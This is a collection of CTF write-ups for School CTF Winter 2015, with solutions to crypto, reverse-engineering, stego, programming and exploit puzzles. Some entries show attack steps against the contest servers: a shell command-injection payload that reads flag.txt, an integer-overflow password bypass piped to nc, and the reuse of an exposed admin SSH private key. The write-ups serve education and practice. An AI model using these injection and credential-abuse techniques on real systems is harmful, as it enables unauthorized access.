* [Indonesian](http://www.hasnydes.us/2015/05/schoolctf-unusual-redirection-300pts/) 
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/05/03/225115)
* [Chinese](http://blog.lionbug.pw/ctf/school-ctf-spring-writeup/) (Down, [Cached version](http://webcache.googleusercontent.com/search?q=cache:9Ss-ircs-WgJ:blog.lionbug.pw/ctf/school-ctf-spring-writeup/+&cd=4&hl=de&ct=clnk&gl=de))
# School CTF Winter 2015: Awesome web

**Category:** Admin
**Points:** 200
**Solves:** 
**Description:**

> My friend is the greatest web designer I've ever seen. Once he even made the web site for his favourite husky Fourier. Sadly he is not very good at site administration.
> 
> <http://sibears.ru:10026/site>
> 
> <http://sibears.ru:12026/site>
> 
> <http://sibears.ru:13026/site>
> 
> Some ports: 11026, 15026, 16026


## Write-up

<div><h3>Awesome web</h3><p>We know that it should be admin mistake so first of all we should check a very common misconfiguration - acces to the parent directory of the site.</p>
<p>In the parent directory we can see <code>flag.txt</code> but we can't read it. </p>
<p>Fortunately we have an access to the admin's ssh keys so we can download the private key and then just use <code>scp admin@&lt;host&gt;:flag.txt . -i admin</code></p></div>

## Other write-ups and resources

* <https://en.internetwache.org/school-ctf-2015-writeups-06-11-2015/>
# School CTF Winter 2015: Can you follow me, Neo?

**Category:** Admin
**Points:** 300
**Solves:** 
**Description:**

> Who needs Matrix when there is BASH?
> 
> 
> [Some bunch of commands](./commands_d036c00bcca4d54ebe0dcde4e3312d680a6b9c2c.txt)


## Write-up

<div><h3>Can you follow me, Neo?</h3><p>In task description we can see the chain of bash commands connected with a pipe, so the output of every command is the input of the next one. That way the only thing we need to do - inverse all the commands from the chain.</p>
<p>To inverse <code>hd</code> we just need to transform hex representations to bytes. Then we could see ruby sript that xor every byte with 0x42, inverse for xor is xor, so just xor our bytes with 0x42 too. The only thing that can went wrong is newlines - output of the <code>base64</code> command can be multiline so before xoring we should remove excess newline symbols. </p>
<p>Next part of commands is pretty easy to inverse, just decode, unzip and decrypt: `base64 -d | unzip -d | openssl enc -rc4 -d -pass pass:hetto'</p>
<p>Command <code>tr</code> replaces the characters from its first argument to the characters in the second argument, so the only thing we need to do - call it with reverse arguments order: <code>tr 'n-za-mN-ZA-M*' 'a-zA-Z '</code></p>
<p>Then just reoderd words according to awk's <code>print</code> order and replace spaces with '_'.</p></div>

## Other write-ups and resources

* none yet
# School CTF Winter 2015: Cipollino, little onion

**Category:** Admin
**Points:** 200
**Solves:** 
**Description:**

> Do you like containers as we do?
> 
> [Image](./image_1cfb4379b82626f0b5d28129ddb5918f8c010aa8.jpg)


## Write-up

We have an image of a rar archieve and the task description tell us about containers, so given image is obviously rarjpeg.

Open it as archieve and exctract an image with QR code.

Decode QR with any online tool and realize that it contains program in C++.

Compile and run it and we get base64 from python code.

Runned python code gives as some hex.

Trait hex as ASCII codes and get the flag.

## Other write-ups and resources

* none yet
# School CTF Winter 2015: 3 bits RGB

**Category:** Crypto
**Points:** 500
**Solves:** 
**Description:**

> Unfortunately, this task is inextricably linked with Russian language.
> 
> 
> Walking around the campus we have found a strange list of Russian words. Looks like it has been lost by someone who is really interested in Russian language and its idioms. Bellow of the list there is one more stange string
> 
> 
> 0x15 0x24 0x90 0xe5 0xed 0xfe 0x8f 0x16 0xb6 0x89 0x0e 0x48
> 
> 
> [Task](./task_c516d0c000419c7e7ab4de9b9dbe5751dad61eda.txt)


## Write-up

<div><h3>3 bits RGB</h3><p>﻿That one is really hard to do even for native Russian speakers, but if you are really good in googling or you are familar with some specialist in Russian language you can try to do it :)</p>
<p>All that words can be connected with some colors to form an idiom like "Голубой вагон", "Жёлтая пресса", "Белая горячка". The next hard part is to translate colors into English without losing its bit structure in RGB. According to task you should match every color with it representation in 3 bits RGB scheme. So if you have cyan color corresponding color will be <code>011</code> cos it consist of green and blue colors mixed in certain proportions.</p>
<p>When we encode all colors in the described way we should to XOR it with a given in the task byte-string and get the flag <code>magic_colors</code></p></div>

## Other write-ups and resources

* none yet
# School CTF Winter 2015: Ancient Message

**Category:** Crypto
**Points:** 300
**Solves:** 
**Description:**

> This message found in the ruins of an ancient city has survived through centuries.
> 
> 
> It looks like our forefathers wanted to pass us some important information.
> 
> 
> Can you help us understand it?
> 
> 
> [Image](./image_79ab8fa05ee578255422bed38ff7e314f88d110c.png)


## Write-up

<div><h3>Ancient Message</h3><p>All of these symbols are symbols of planets. Every symbols encodes number according to the planet order. Sun is number 0, Mecury is 1, Venus is 2, etc. </p>
<p>There are several kinds of spaces in image. There are big spaces, small spaces, and very small spaces (2 symbols stay together). Big spaces are spaces between words. Small spaces are spaces between letters. 2 symbols together is a letter with number in alphabet consists of 2 numbers.</p>
<p>Standalone symbol is a symbol with number in alhapet consists of 1 number.</p></div>

## Other write-ups and resources

* none yet
# School CTF Winter 2015: Cyber criminal

**Category:** Crypto
**Points:** 200
**Solves:** 
**Description:**

> Not long ago we have maged to arrest a dangerous cyber criminal known as m/-\d~M@Xor.
> 
> 
> We have managed to decrypt all files on his laptop, but the one on paper turned out to be too hard for our specialists!
> 
> 
> We have heard you are great at cracking ciphers so we are asking you for help. Decrypt the last message and help us close the deal!
> 
> 
> Detective Sergeant R.Mueller, FBI
> 
> 
> [Image](./image_2a3f9ab6e49d2b1b7ddd73506c6afa1060e19fd3.jpg)


## Write-up

<div><h3>Cyber criminal</h3><p>Obviously the table is some sort of a key for the message.</p>
<p>We could try to google for ciphers that uses a table with cutouts and found out that it is Cardan grille cipher. Or just make an assumption that table is used to get some characters from the text written in such table.</p>
<p>So we just need to write text in 8 rows and try to get some phrase from cut out cells. The only meaningfull begining is "we_glad", so we found starting position for our grille.</p>
<p>Then just read letters from cut areas and rotate the grille CW untill you get the flag.</p></div>

## Other write-ups and resources

* none yet
# School CTF Winter 2015: Lazy cryptanalyst

**Category:** Crypto
**Points:** 100
**Solves:** 
**Description:**

> Looks like I'm too lazy to complete it. >_< Can you help me a little?
> 
> 
> bsxz xz om rxuvi. bsiri qri oqym gbsirz vxji xb, whb bsxz gyi xz oxyi. om rxuvi xz om wizb urxiye. xb xz om vxui. x ohzb oqzbir xb qz x ohzb oqzbir om vxui. fxbsghb oi, om rxuvi xz hzivizz. fxbsghb om rxuvi, x qo hzivizz. x ohzb uxri om rxuvi brhi. x ohzb zsggb zbrqxlsbir bsqy om iyiom, fsg xz brmxyl bg jxvv oi. x ohzb zsggb sxo wiugri si zsggbz oi. x fxvv. wiugri lge x zfiqr bsxz kriie: om rxuvi qye omzivu qri eiuiyeirz gu om kghybrm, fi qri bsi oqzbirz gu ghr iyiom, fi qri bsi zqpxgrz gu om vxui. zg wi xb, hybxv bsiri xz yg iyiom, whb ciqki. uvql xz q eqm fxbsghb wvgge xz vxji q eqm fxbsghb zhyzsxyi. qoiy.
> 
> 
> [Image](./image_0faf3e88f05801b6084363586617de51e128dea2.jpg)


## Write-up

<div><h3>Lazy cryptanalyst</h3><p>Looking at the picture in task we could realize that it is simple substitution cipher.</p>
<p>Let's google for that nice site from picture. To do it google for phrase from the picture <code>To Crack a Substitution Cipher</code> and find the site looking like our example.</p>
<p>On a picture we have some letters cracked so we need to continue doing some assumptions about the plaint text, like "bsi" is a "the", "bsiri" - "these", "xb" - "it" and so on.</p>
<p>Trying to get meaningful words we can decrypt all the message. The phrase in the message that follows "flag is" is obviously our flag.</p></div>

## Other write-ups and resources

* <https://en.internetwache.org/school-ctf-2015-writeups-06-11-2015/>
# School CTF Winter 2015: Master of guesswork

**Category:** Crypto
**Points:** 200
**Solves:** 
**Description:**

> Even the best ciphers are weak when you know the plain text.
> 
> 
> [Attachment](./crypto_c94350c7bc3ccac4e6f44f46b4ba69086b73c4d0.py)


## Write-up

<div><h3>Master of guesswork</h3><p>The task states that we know a part of the plaintext. By looking at the script one could realise that it tries to decrypt an encrypted <strong>URL</strong> and download the content. So we need to think of what we already know about the <strong>URL</strong>.</p>
<p>By reading the <a href="https://en.wikipedia.org/wiki/Uniform_Resource_Identifier">wiki page</a> you can make a first guess: It is a scheme; let's try <code>http</code> or <code>https</code>. Using given function to xor stored url with string <code>http://</code> we will get a part of the password <code>3asy_p</code>.</p>
<p>Now we need to do the second guess. Each <strong>URL</strong> can start with <code>www</code>, e.g. <code>www.google.com</code>. Use the function again with string <code>http://www</code> as a key and get <code>3asy_p@ss3a</code>.</p>
<p>So looks like we have the whole key <code>3asy_p@ss</code>, trying to execute the script with that key we will download you the flag.</p></div>

## Other write-ups and resources

* none yet
# School CTF Winter 2015: Command line security

**Category:** Exploit
**Points:** 300
**Solves:** 
**Description:**

> Famous junior pentester Johnny Droptables is still improving his security skills. Unfortunately it's not always harmless for others.
> 
> 
> Here's a message he has posted on the site with short manuals for linux commands:
> 
> 
> Lulz always thought linux users r good enough in sevurity, but u did it so wr00ng :D Read ur manuals and fix it asap before some chi1d dont break it ffs!
> 
> <http://sibears.ru:10001/>
> 
> 
> <http://sibears.ru:12001/>
> 
> 
> <http://sibears.ru:13001/>


## Write-up

<div><h3>Command line security</h3><p>The hardest part is to determine that it is the <a href="https://www.owasp.org/index.php/Command_Injection">CLI injection</a>. Then we just try:</p>
<ul>
<li><code>ls</code> -- just man</li>
<li><code>; ls</code> -- no success</li>
<li>try to close <code>"</code>: <code>"; ls;"</code> -- sucess</li>
</ul>
<p>Now just enter <code>"; cat flag.txt; "</code></p></div>

## Other write-ups and resources

* <http://pastebin.com/wMVDbfse>
# School CTF Winter 2015: Heartless types

**Category:** Exploit
**Points:** 100
**Solves:** 
**Description:**

> Sometimes a good password can become absolutely useless.
> 
> 
> nc sibears.ru 10013
> 
> 
> nc sibears.ru 12013
> 
> 
> nc sibears.ru 13013
> 
> 
> [Sources](./task14_9fded4da07a1fa9a571bd035093b043a5f3b514b.c)


## Write-up

<div><h3>Heartless types</h3><p>The only way to get the flag without knowing password is to never enter the loop which checks it. To accomplish it we need <code>min_len</code> equal to <code>0</code>.</p>
<p>From the program text above we know that <code>min_len</code> is the minimum of <code>strlen(stored_pass) + 1</code> and <code>++password_len</code> with <code>password_len</code> input by you. </p>
<p>Knowing that you need to make <code>password_len + 1</code> equal to <code>0</code>, which means that <code>password_len</code> has to be equal to <code>-1</code>. Or according to the variable type, equal to <code>255</code>.</p>
<p>So you only need to send <code>255</code> to server and then send <code>255</code> random letters, which can be accomplished with a simple python script, e.g. </p>
<p><code>python -c 'print "255\n"+"a"*255' | nc &lt;host&gt; &lt;port&gt;</code> and get the flag.</p></div>

## Other write-ups and resources

* none yet
# School CTF Winter 2015: Try to guess

**Category:** Exploit
**Points:** 500
**Solves:** 
**Description:**

> The program uses cutting-edge tech random numbers generator. Hack it!
> 
> 
> nc sibears.ru 10007
> 
> 
> nc sibears.ru 12007
> 
> 
> nc sibears.ru 13007
> 
> 
> [Task_x86](./task7_x86_6cea5e1980e8f3c19e34a1dac4747921d7717a8b) [Task_x86_64](./task7_x86_64_7fcab081788fd56a7144f6f879badb1360aa3e78)


## Write-up

<div><h3>Try to guess</h3><p>In first two client's tries to guess server generates two numbers and sends them. Third try depends on first two, specifically:</p>
<p>There are two global variables first_try and second_try initiated by input/output of two first tries respectively, and one named unguessable that is initiated by them in third try:</p>
<pre><code>first_try = ((input[0] + 1)* output[0] ) % 16 + 1
second_try = (input[1] + 1)* output[1]

unguessable = 0;
for (i = 0; i &lt; first_try; ++i) 
    unguessable ^= rot(second_try, i + 1)
</code></pre>
<p>In order to succeed in third try one must go through the same transformations as server does, which is totally doable, because server sends us generated randoms.</p>
<p>The easiest way to do it is send <code>2^32-1</code> or <code>4294967295</code> twice, which will lead to a 32bit integer overflow (might not on some processors) and turn</p>
<pre><code>first_try=1 and second_try=unguessable=0
</code></pre>
<p>Thus releasing us from writing scripts :-)</p></div>

## Other write-ups and resources

* none yet
# School CTF Winter 2015: Feel like Siberian

**Category:** Joy
**Points:** 200
**Solves:** 
**Description:**

> Hi! We are from Siberia and we want to spread this feeling.
> 
> 
> Feel it, take a team selfie, tweet it with hashtag #SchoolCTF and don't forget to open your profile for us to check the photo and send the flag via personal messaging.
> 
> 
> Good luck!


## Write-up

<div><h3>Feel like Siberian</h3><p>Use your imagination :)</p></div>

## Other write-ups and resources

* none yet
# School CTF Winter 2015: Highly professional

**Category:** Joy
**Points:** 100
**Solves:** 
**Description:**

> A big computer security company needs a highly qualified recon expert.
> 
> 
> Think you're the one? If so you just have to find out a name of the company owner. The name is your interview pass.
> 
> 
> Flag format: firstname_lastname, e.g. john_snow
> 
> 
> [Image](./image_779ded31b8001fccf8d241461c97d4f9f36242fa.jpg)


## Write-up

<div><h3>Highly professional</h3><p>We need to find company owner name, so the first step is to determine the company name. Looking at given photo we can read "AllSafe". </p>
<p>Asking Goolge for <code>"AllSafe"</code> give us tons of links, but what if we add <code>computer security</code> (we know that company is engaged in computer security from the task) we get the links telling us that it is a company from TV series "Mr. Robot". </p>
<p>Now just google for <code>mr robot allsafe onwer</code> and get the answer - Gideon Goddard</p></div>

## Other write-ups and resources

* <https://en.internetwache.org/school-ctf-2015-writeups-06-11-2015/>
# School CTF Winter 2015: Information leak

**Category:** Joy
**Points:** 500
**Solves:** 
**Description:**

> Organizing a CTF is not a simple task. We are doing our best to test all the challenges and let you have fun solving it.
> 
> 
> But with such a heavy workload one can't be sure no piece of information leaks to the people that don't need to know it.
> 
> 
> Not so long ago we noticed a part of a description of one of our tasks posted to our team's community in Vkontakte. Can you find it?
> 
> 
> Send the link to the leaked information and the title of the compromised task to our twitter via personal message.
> 
> 
> Don't forget to open your profile for sending flag to you.


## Write-up

<div><h3>Information leak</h3><p>Look at that <a href="https://vk.com/sibears_tomsk?z=photo-101662641_383626839%2Fwall-101662641_81">photo</a>. </p>
<p>There is some strange scheme on a desc that describes some <code>flag</code> transformations.</p>
<p>That scheme includes a step with <code>QR code</code> and only task with a QR code is <code>Cipollino, little onion</code></p></div>

## Other write-ups and resources

* none yet
# School CTF Winter 2015: Newton style

**Category:** Joy
**Points:** 200
**Solves:** 
**Description:**

> Win the game and get the flag!
> 
> 
> [Game for linux](http://school-ctf.org/files/task29l_a6eeaaaf605746d5beaef809945812b29f142b03.zip) [Game for windows](http://school-ctf.org/files/task29w_1c4e393acb15cfd8d94779cb94e99dc2ce2bdbeb.zip)

[Alternative download (Game for linux)](https://mega.nz/#!rc91QDZZ!fc87k2C7InHjTimS62JU7guhqpr4xDdbI-XZ4SLFr9A) and [Alternative download (Game for windows)](https://mega.nz/#!XVEAwSiZ!V1GJP19EpYtxUgltGmAqlRIbpLJAHeYbzYGYtDOm2qc)


## Write-up

<div><h3>Newton style</h3><p>Earn 1000 points or just use <code>strings</code> on <code>level0</code></p></div>

## Other write-ups and resources

* none yet
# School CTF Winter 2015: Bonkers Banker

**Category:** Ppc
**Points:** 400
**Solves:** 
**Description:**

> I know an old mad moneybags. He had invented his own language but nobody wanted to talk in it. Then he decided to give all his money to the guy who can talk with him and will be very good at accounting.
> 
> 
> nc sibears.ru 10028
> 
> 
> nc sibears.ru 12028
> 
> 
> nc sibears.ru 13028
> 
> 
> May be that piece of code will be useful for you:
> 
> 
> def encode(self, str):
> 
>    codes = []
> 
>    for c in str:
> 
>      codes.append(hex(ord(c))[::-1])
> 
>    return ' '.join(codes)


## Write-up

<div><h3>Bonkers Banker</h3><p>When we connect to the service we will see something like <code>23x0 02x0 a2x0 02x0 23x0</code>. Let's try to decode it according to given algorithm.</p>
<ul>
<li>Reverse hex codes <code>0x32 0x20 0x2a 0x20 0x23</code>.</li>
<li>Decode it: <code>2 * 2</code></li>
<li>Solve <code>2 * 2 = 4</code></li>
<li>Encode the answer back <code>4</code> -&gt; <code>0x34</code> -&gt; <code>43x0</code></li>
<li>Send it to the server and get the next challenge</li>
<li>Repeat until you get the flag</li>
</ul></div>

## Other write-ups and resources

* none yet
# School CTF Winter 2015: Erratic Elder

**Category:** Ppc
**Points:** 100
**Solves:** 
**Description:**

> Walknig through the twisted World Wide Web we've found a strange old man. He has said he is an Oracle and keeps a Secret. We've tried to get it but only thing we managed to find is the language he speaks.
> 
> 
> Ask him with "= n", "< n" or "> n" with any number n and prove that you are smart enough to get the Secret!
> 
> 
> nc sibears.ru 10027
> 
> 
> nc sibears.ru 12027
> 
> 
> nc sibears.ru 13027


## Write-up

<div><h3>Erratic Elder</h3><p>Common "guess the number" task.</p>
<p>The only problem is that we do not know the upper bound of the number.</p>
<p>So first of all find the approximate upper bound and then just use binary search.</p></div>

## Other write-ups and resources

* none yet
# School CTF Winter 2015: My Little Grep Quest

**Category:** Ppc
**Points:** 200
**Solves:** 
**Description:**

> Follow the white rabbit! Khm.. I mean ["file"](http://school-ctf.org/files/start_dec1dd9b04e5e6f51e017573270dec210106031a.zip)

[Alternative download](https://mega.nz/#!fFFFgAhY!aaF5b4L8HTVKJ92jZ-x32eCBYeHkSEXxLFKXFz4e9gE)


## Write-up

<div><h3>My Little Grep Quest</h3><p>We have an archive with couple of folders and file <code>start.txt</code>.</p>
<p>That file contains the full path to the next text file. The next file contains the first letter of the flag and path of the next txt file.</p>
<p>Little automation and we wil have a flag.</p></div>

## Other write-ups and resources

* none yet
# School CTF Winter 2015: With a Speed Force

**Category:** Ppc
**Points:** 300
**Solves:** 
**Description:**

> Agent! We have been informed that so called "superheroes" have secrets from the goverment! It's absolutely unacceptalbe! We order you to infiltrate their team and get an access to the secret information on their server.
> 
> 
> Do it as soon as possible! National security is under a big threat!
> 
> 
> Agent Smith, NSA.
> 
> 
> <http://sibears.ru:10002/>
> 
> 
> <http://sibears.ru:12002/>
> 
> 
> <http://sibears.ru:13002/>


## Write-up

<div><h3>With a Speed Force</h3><p>Obviously to get the secret we need to join the team, but when we try to join it says that we must save world more often. </p>
<p>We have 10 seconds to click the button enough times and register the user. It can be done with any mouse clicker tool or simple javascipt like that: </p>
<pre><code>for (var i = 0; i &lt; 101; i++) {
  $("i.circle").click()
}
$("form").submit()
</code></pre>
<p>When you succeed you will be able to see the secret - it's your flag.</p></div>

## Other write-ups and resources

* none yet
# School CTF Winter 2015 write-ups

* <http://school-ctf.org/>
* [Scoreboard](http://school-ctf.org/#rating-ref) or [local alternative](TODOLOCAL)
* Site hosts all writeups (writeup.md) here

## Completed write-ups

* [admin/awesome-web-200](admin/awesome-web-200)
* [admin/can-you-follow-me-neo-300](admin/can-you-follow-me-neo-300)
* [admin/cipollino-little-onion-200](admin/cipollino-little-onion-200)
* [crypto/3-bits-rgb-500](crypto/3-bits-rgb-500)
* [crypto/ancient-message-300](crypto/ancient-message-300)
* [crypto/cyber-criminal-200](crypto/cyber-criminal-200)
* [crypto/lazy-cryptanalyst-100](crypto/lazy-cryptanalyst-100)
* [crypto/master-of-guesswork-200](crypto/master-of-guesswork-200)
* [exploit/command-line-security-300](exploit/command-line-security-300)
* [exploit/heartless-types-100](exploit/heartless-types-100)
* [exploit/try-to-guess-500](exploit/try-to-guess-500)
* [joy/feel-like-siberian-200](joy/feel-like-siberian-200)
* [joy/highly-professional-100](joy/highly-professional-100)
* [joy/information-leak-500](joy/information-leak-500)
* [joy/newton-style-200](joy/newton-style-200)
* [ppc/bonkers-banker-400](ppc/bonkers-banker-400)
* [ppc/erratic-elder-100](ppc/erratic-elder-100)
* [ppc/my-little-grep-quest-200](ppc/my-little-grep-quest-200)
* [ppc/with-a-speed-force-300](ppc/with-a-speed-force-300)
* [reverse/parallel-comparator-200](reverse/parallel-comparator-200)
* [reverse/secret-galaxy-300](reverse/secret-galaxy-300)
* [reverse/secret-string-400](reverse/secret-string-400)
* [reverse/simple-check-100](reverse/simple-check-100)
* [reverse/whats-the-hell-500](reverse/whats-the-hell-500)
* [stegano/favourite-song-300](stegano/favourite-song-300)
* [stegano/meaningless-text-200](stegano/meaningless-text-200)
* [stegano/pure-color-100](stegano/pure-color-100)
* [web/hunger-games-100](web/hunger-games-100)
* [web/poetry-of-hacking-200](web/poetry-of-hacking-200)
* [web/voting-fraud-400](web/voting-fraud-400)

## External write-ups only

* none yet

## Missing write-ups# School CTF Winter 2015: Parallel Comparator

**Category:** Reverse
**Points:** 200
**Solves:** 
**Description:**

> Enter right key.
> 
> 
> [Source](task11_79e3a03bc339d6cbe51c0e8f22bd59234461f4f4.c)


## Write-up

<div><h3>Parallel Comparator</h3><p><code>highly_optimized_parallel_comparsion(user_string)</code> is the main function in a program. It checks a user string. There is a <code>variable first_letter = (initialization_number % 26) + 97</code> in the function. It seems that initialization_number variable is generated randomly. </p>
<p>But actually there is no <code>srandom()</code> call or any other function to seed a number generator. So the value of first_letter is the same in every program call. We can get the value from a debugger. </p>
<p>The next thing is a differences array a with length of <code>FLAG_LEN</code>. This is an array of differences beetween an <code>i-th</code> symbol of flag and <code>0-th</code> symbol of flag. If you understand this moment it is easy to get flag right now by script similar to this python one:</p>
<pre><code>differences = [0, 9, -9, -1, 13, -13, -4, -11, -9, -1, -7, 6, -13, 13, 3, 9, -13, -11, 6, -7]
first_letter = 108
print ''.join([chr(first_letter+differences[i]) for i in xrange(len(differences))])
</code></pre>
<p>Function <code>checking()</code> is called in a new thread with three arguments: <code>first_letter</code>, <code>differences[i]</code> and <code>user_string[i]</code>. This function checks <code>i-th</code> symbol of <code>user_string</code> comparing it with <code>first_letter+differences[i]</code> symbol.</p>
<p>After all the loops of the function <code>checking()</code> there goes a final check in a loop. On each iteration it takes the result of the <code>i-th</code> thread a forms an array named generated_string. It goes like this: </p>
<p><code>generated_string[i] = (char)result + just_a_string[i]</code></p>
<p>And the final step is checking whether each symbol of generated_string is equal to that of <code>just_a_string</code>. It is true if the correct string was inputed resulting in each thread returning <code>0</code>.</p></div>

## Other write-ups and resources

* <http://home.in.tum.de/~hagenloc/content/schoolctf-wu1/index.html>
# School CTF Winter 2015: Secret Galaxy

**Category:** Reverse
**Points:** 300
**Solves:** 
**Description:**

> They say there is an inhabited galaxy next to ours.
> 
> 
> We've got a strange program that gives information about nearby galaxies. At the first glance one would think it says nothing about the secret one...
> 
> 
> [Task.x86](./task10_x86_ff48c020ee7031c05d725ccca9a4f0ddb548a79b) [Task.x86-64](./task10_x86_64_381edebcfd6c9fccf683fe8315842030591ea434) [Task-x86.exe](./task10_x86_89ec72d2e52ccd6a8fef8a95ed868187ed2f0202.exe)


## Write-up

<div><h3>Secret Galaxy</h3><p>Program otput is a content of galaxy database. According to the story we need to find one more galaxy hiding in the binary. Let's check the program for debug information.</p>
<pre><code>strip task4
task4: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=1577ba67c51b6a8c49caacd2b4fe578c502619a9, not stripped
</code></pre>
<p>Binary not stripped, so it has debug info. So debugger will be usefull to solve it. We can use GDB.</p>
<pre><code>gdb ./task4
(gdb) br main
(gdb) r
78      fill_starbase(starbase);
(gdb) n
79      print_starbase(starbase);
(gdb) print starbase
$1 = [{name = 0x400a38 "NGS 2366", distance = 1804289383, is_inhabited = 0, secret_information = 0x0, next = 0x6010bc &lt;starbase+40&gt;, pred = 0x0}, {name = 0x400a41 "Andromeda", distance = 846930886, is_inhabited = 0, secret_information = 0x0, next = 0x6010e4 &lt;starbase+80&gt;, pred = 0x601094 &lt;starbase&gt;}, {name = 0x400a4b "Messier", distance = 1681692777, is_inhabited = 0, secret_information = 0x0, next = 0x60110c &lt;starbase+120&gt;, pred = 0x6010bc &lt;starbase+40&gt;}, {name = 0x400a53 "Sombrero", distance = 1714636915, is_inhabited = 0, secret_information = 0x0, next = 0x601134 &lt;starbase+160&gt;, pred = 0x6010e4 &lt;starbase+80&gt;}, {name = 0x400a5c "Triangulum", distance = 1957747793, is_inhabited = 0, secret_information = 0x0, next = 0x60115c &lt;sc&gt;, pred = 0x60110c &lt;starbase+120&gt;}]
</code></pre>
<p>Starbase is a mapped list. Every item has pointer to the next one. One of the fields of the galaxy structure is secret_information field, which doesn't appears in an output of the program. The next thing is that a <code>next</code> field of the last item of list is not equal to <code>NULL</code>. Let's look at that address.</p>
<pre><code>(gdb) x/10qw 0x60115c
0x60115c &lt;sc&gt;:  0x00400a67  0x00000000  0x00007a69  0x00000001
0x60116c &lt;sc+16&gt;:   0x00601184  0x00000000  0x00000000  0x00000000
0x60117c &lt;sc+32&gt;:   0x00000000  0x00000000
</code></pre>
<p>Look at every address in the structure and find a flag.</p>
<pre><code>...
(gdb) x/1s 0x00601184
0x601184 &lt;sc+40&gt;:   "aliens_are_around_us"
</code></pre></div>

## Other write-ups and resources

* none yet
# School CTF Winter 2015: Secret string

**Category:** Reverse
**Points:** 400
**Solves:** 
**Description:**

> Enter valid string and you will know the flag!
> 
> 
> [Source](./Task_5add03f1c70426f94c4f6f8c8d72cf04fee3eb98.tar.gz)


## Write-up

<div><h3>Secret string</h3><p>Here is a simple virtual machine. We should understand all opcodes meaning and somehow translate bytecode into human-readable code or just replace "run" function and get trace of our program:</p>
<pre><code>function run(){
    while(this.PC &lt; this.code.length){
        var command = parseCommand.call(this)
        console.log(command.args);
        command.execute(this);
    }
}
</code></pre>
<p>After that we can find actual check function:</p>
<pre><code>var f = window.machine.registers[1].userinput
var i = f.length
var nonce = 'groke';
var j = 0;
var out = [];
var eq = true;
while (j &lt; i) {
    out.push(f.charCodeAt(j) ^ nonce.charCodeAt(j % 5))
    j++;
}
var ex = [1, 30, 14, 12, 69, 14, 1, 85, 75, 50, 40, 37, 48, 24, 10, 56, 55, 46, 56, 60];
if (ex.length == out.length) {
    j = 0;
    while (j &lt; ex.length) {
        if (ex[j] != out[j])
            eq = false;
        j += 1;
    }
    if (eq) {
        alert('YOU WIN!');
    } else {
        alert('NOPE!');
    }
} else {
    alert('NOPE!');
}
</code></pre></div>

## Other write-ups and resources

* none yet
# School CTF Winter 2015: Simple Check

**Category:** Reverse
**Points:** 100
**Solves:** 
**Description:**

> Enter the right key.
> 
> 
> [Task.x86](./task9_x86_2fb0b7e96f097597851f24faaf664fdb20ad8b8a) [Task.x86-64](./task9_x86_2fb0b7e96f097597851f24faaf664fdb20ad8b8a) [Task_x86.exe](./task9_x86_ed82b6faaf979658e040c77422d01b1b3db183f7.exe)


## Write-up

<div><h3>Simple Check</h3><p>Binary wants us to enter a key. Lets analyse it by GDB.</p>
<pre><code>gdb ./task5
(gdb) br main
(gdb) r

Key:12345
</code></pre>
<p>Get to this line.</p>
<pre><code>=&gt; 0x804870f &lt;main+249&gt;:    call   0x804851b &lt;check_key&gt;
(gdb) ni
=&gt; 0x8048714 &lt;main+254&gt;:    add    esp,0x10
(gdb) ni
=&gt; 0x8048717 &lt;main+257&gt;:    test   eax,eax
(gdb) i r eax
eax            0x0  0
</code></pre>
<p>Obviously <code>12345</code> is a wrong key and checiking falied. Let's try to change situation and put in eax non-zero value.</p>
<pre><code>(gdb) set $eax = 1
(gdb) c
Continuing.
</code></pre>
<p><code>flag_is_you_know_cracking!!!</code></p></div>

## Other write-ups and resources

* none yet
# School CTF Winter 2015: What's the hell?!

**Category:** Reverse
**Points:** 500
**Solves:** 
**Description:**

> We've found a way to make C++ variables more "expressive" and beautiful. Although we've lost an ability to understand code. What the heck is going on here?!
> 
> 
> [Somelib.hxx](./somelib_58812b3ff990df0134f46402d65f2fc75bd7cd07.hxx) [Task.hxx](./task8_2872d2972af694d650d01d1247810678facfb35c.cxx)


## Write-up

<div><h3>What's the hell?!</h3><p>There are 4 equations systems, which depend on password. Each one of them has 3 equations and depend on 3 variables.</p>
<pre><code>1) p[0] + p[1] = 101
   p[1] + p[2] = 143
   p[0] * p[2] = 5035

2) p[3] + p[5] = 163
   p[3] + p[4] = 226
   p[4] * p[5] = 5814

3) p[7] + p[8] = 205
   p[6] + p[8] = 173
   p[6] * p[7] = 9744

4) p[9] + p[10] * p[11] = 5375
   p[10] + p[9] * p[11] = 4670
   p[9] + p[10] = 205
</code></pre>
<p>They are constructed in such way, that the solution exists. There are several ways to get right sides of equations: 
1. Simply <code>std::cout</code> them
2. Spot that they look like lines, rectangles and cubes of corresponding sizes
3. Use debuggers in runtime
4. Google a lot and find analog literals library with documentation and examples
5. Read and understand the code of library</p></div>

## Other write-ups and resources

* none yet
# School CTF Winter 2015: Favourite song

**Category:** Stegano
**Points:** 300
**Solves:** 
**Description:**

> Love this song so much! Although sometimes i can hear a noise (can it be possible with my $10k headset?!) that spoils all the feeling!
> 
> 
> [Song](./task_dd270725417ee49ec65e6923cad1d96d1ed34447.mp3)


## Write-up

<div><h3>Favourite song</h3><p>Task tells us about some noises in the music. So the best way to check them is to see at sound histogram. </p>
<p>We can see some strange peaks on the histogram. Lets try to interpret it as Morse code (it's very common in defferent task with hidden information).</p>
<p>Decoding first peaks - long for dash and shorter for dots - we get <code>flag</code>. You just need to continue and get all the flag.</p></div>

## Other write-ups and resources

* none yet
# School CTF Winter 2015: Meaningless Text

**Category:** Stegano
**Points:** 200
**Solves:** 
**Description:**

> It is absolutely meaningless text, isn't it?
> 
> 
> [Text](./task12_5b01f6a519d9a567ca098416e1499f8464e10c0c.html)


## Write-up

<div><h3>Meaningless Text</h3><p>html page is given. It contains meaningless text, but some words are italic in it. Let's try cut all such words.</p>
<p><code>grep -o -e "&lt;em&gt;[^/]*&lt;/em&gt;" st2.html</code></p>
<pre><code>&lt;em&gt;flag&lt;/em&gt;
&lt;em&gt;is&lt;/em&gt;
&lt;em&gt;not&lt;/em&gt;
&lt;em&gt;this&lt;/em&gt;
&lt;em&gt;line&lt;/em&gt;
&lt;em&gt;but&lt;/em&gt;
&lt;em&gt;you&lt;/em&gt;
&lt;em&gt;think&lt;/em&gt;
&lt;em&gt;right&lt;/em&gt;
&lt;em&gt;way&lt;/em&gt;
</code></pre>
<p>Hmm.. So we need to cut something else. We can try words with <code>&lt;e&gt;</code> tag. There are many such words in the page.</p>
